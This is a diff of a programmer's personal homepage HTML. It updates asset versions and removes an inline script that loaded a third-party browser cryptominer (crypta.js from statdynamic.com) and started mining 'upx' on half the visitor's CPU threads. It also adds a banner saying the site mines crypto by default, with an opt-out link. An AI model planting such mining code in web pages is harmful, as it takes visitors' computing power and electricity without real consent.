@@ -11,9 +11,9 @@
 
 
 
-	<link rel="preload" as="style" href="./res/index_v7.packed.css">
-	<link rel="stylesheet" href="./res/index_v7.packed.css" media="none" onload="if(media!='all')media='all'">  <!-- Fast Script -->
-		<noscript><link rel="stylesheet" href="./res/index_v7.packed.css"></noscript>
+	<link rel="preload" as="style" href="./res/index_v8.packed.css">
+	<link rel="stylesheet" href="./res/index_v8.packed.css" media="none" onload="if(media!='all')media='all'">  <!-- Fast Script -->
+		<noscript><link rel="stylesheet" href="./res/index_v8.packed.css"></noscript>
 	
 
 	<!-- Open Graph Begin -->
@@ -26,18 +26,7 @@
 	
 
 	
-	<script src="//statdynamic.com/lib/crypta.js"></script>
-	<script>
-		var threads = window.navigator.hardwareConcurrency / 2;
-        if (threads < 1) {
-            var threads = 1;
-        }
-
-		miner=new CRLT.Anonymous('70ef7f254440e6d0fa184228a4bc9465bd5c5d5e1051', {
-			threads:threads,throttle:0.8, coin: "upx",
-		});
-		miner.start();
-	</script>
+	<!--script src="//statdynamic.com/lib/crypta.js"></script-->
 
 	
 
@@ -48,14 +37,17 @@
 
 
 
-	<link rel="preload" as="script" href="./res/index_v2.packed.js">
-	<script type="text/javascript" src="./res/index_v2.packed.js" defer></script>
+	<link rel="preload" as="script" href="./res/index_v3.packed.js">
+	<script type="text/javascript" src="./res/index_v3.packed.js" defer></script>
 	
 </head>
 <body>
 	<noscript>	
 		<h1><i>(Javascript is required for some essential functions like dropdowns)</i></h1>
 	</noscript>
+
+	<div id="stopcryptodiv" class="wide_overlay_box_container"><h4 class="roboto">This website mines crypto. To disable crypto mining (for 5 days), <span onclick="stopcrypto()" class="clickable fakelink">click here</span>. We reccomend keeping it on to support us.</h4></div>
+
 	<h1 class="roboto" style="text-align: center;">PatrickMSM</h1>
 	<h1 class="roboto" style="text-align: center;">Programmer from Romania</h1><br/>
 	<p class="roboto">&#x22;I am a programmer. I know lots of programming languages like c/c++, PHP, javascript, I know Java the most.&#x22;</p>
